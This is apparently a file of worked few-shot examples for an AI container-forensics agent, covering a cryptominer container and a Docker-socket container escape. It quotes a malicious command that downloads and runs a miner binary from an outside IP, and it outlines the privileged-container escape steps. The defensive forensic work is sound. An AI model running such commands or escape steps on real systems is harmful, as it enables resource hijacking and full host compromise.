# Container Analyst — Worked Examples

Externalized from the agent definition per the few-shot-examples rule (#1587).

### Example 1: Unauthorized Container Running Cryptominer (Simple)

**Scenario**: Investigate a Docker host with unexplained CPU usage.

**Finding**:
```bash
docker ps -a --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.CreatedAt}}"
# nginx-proxy   nginx:1.21       Up 30 days
# app-server    myapp:latest     Up 30 days
# xmr-worker    alpine:3.16      Up 2 days    ← created during incident window
```

Inspection of `xmr-worker`:
```bash
docker inspect xmr-worker --format '{{.Config.Cmd}}'
# [/bin/sh -c wget http://185.220.101.47/miner -O /tmp/m && chmod +x /tmp/m && /tmp/m]
```

**Finding**: Unauthorized container running a cryptominer, created 2 days ago matching the incident window. Container executes a downloaded binary. ATT&CK: T1496 — Resource Hijacking. Preserve the container (do not `docker rm`) for evidence. Extract the miner binary from the container filesystem for analysis.

---

### Example 2: Container Escape via Docker Socket (Moderate)

**Scenario**: Analyze a compromised web application container for host escape.

**Finding**:
```bash
docker inspect webapp --format '{{range .Mounts}}{{.Source}}:{{.Destination}}{{"\n"}}{{end}}'
# /var/run/docker.sock:/var/run/docker.sock
# /var/www/html:/var/www/html
```

The Docker socket is mounted. The web application container could control the Docker daemon. Checking Docker daemon logs for container creation events originating from inside `webapp`:

```bash
journalctl -u docker | grep "container create" | grep -A2 "2024-03-15T02"
# POST /v1.41/containers/create  (from container webapp)
# Container created: alpine with Binds:[/:/host] Privileged:true
```

**Finding**: Container escape confirmed. Attacker accessed the Docker socket from inside `webapp`, created a privileged container with the host root filesystem mounted at `/host`, and achieved full host access. ATT&CK: T1611 — Escape to Host. This is a full host compromise — escalate immediately.
